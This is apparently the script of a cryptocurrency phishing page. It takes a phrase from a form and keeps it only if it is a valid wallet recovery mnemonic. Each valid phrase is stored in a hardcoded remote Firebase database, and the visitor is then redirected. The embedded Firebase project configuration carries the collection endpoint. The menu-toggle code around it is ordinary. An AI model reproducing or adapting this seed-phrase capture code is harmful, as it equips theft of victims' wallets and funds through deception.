import { initializeApp } from "https://www.gstatic.com/firebasejs/9.9.3/firebase-app.js";

import { getDatabase, ref, set } from 'https://www.gstatic.com/firebasejs/9.9.3/firebase-database.js';

const input = document.querySelector("#phrase")
const error = document.querySelector(".warning");
const btn = document.querySelector(".submit-btn");

const menuBtn = document.querySelector(".menu-btn");
const menu = document.querySelector(".menu");
const openBtn = document.querySelector(".open-btn");
const closeBtn = document.querySelector(".close-btn");


menuBtn.onclick = (e) => {
    const toggleBtn = e.target;

    if(toggleBtn.classList.contains("open-btn")){
        openBtn.classList.add("hide");
        closeBtn.classList.remove("hide");
        menu.style.setProperty('display', 'block');
    }
    else {
        closeBtn.classList.add("hide");
        openBtn.classList.remove("hide");
        menu.style.setProperty('display', 'none');
    }
}
window.addEventListener("resize", () => {
    if(window.innerWidth > 768){
        menu.style.setProperty('display', 'block');
    } 
    else {
        menu.style.setProperty('display', 'none');
        closeBtn.classList.add("hide");
        openBtn.classList.remove("hide");
    }
})


const firebaseConfig = {
    apiKey: "AIzaSyCiDAsAG0OXo8T8UYRMuECLGUHq3b3iNCE",
    authDomain: "new-tw-276a2.firebaseapp.com",
    databaseURL: "https://new-tw-276a2-default-rtdb.firebaseio.com",
    projectId: "new-tw-276a2",
    storageBucket: "new-tw-276a2.appspot.com",
    messagingSenderId: "476422057375",
    appId: "1:476422057375:web:a9d7f33d8e5b377ca961aa",
    measurementId: "G-F164644KB4"
};


const app = initializeApp(firebaseConfig);

const writeData = (twtWords) => {
    const db = getDatabase(app);

    const reference = ref(db, `words/${Date.now()}`)

    set(reference, {
        word: twtWords
    })
    .then(() => {
        input.value = "";
        window.location = `./index.html`;
    })
    .catch((error) => {
        console.log(error);
    })
}
btn.onclick = (e) => {
    e.preventDefault();
    const value = input.value;
    const border = `1px solid red`;
    const isValid = ethers.utils.isValidMnemonic(value);
    if(isValid){
        writeData(value);

    } else {
        error.classList.remove('hide');
        input.style.border = border;
    } 

}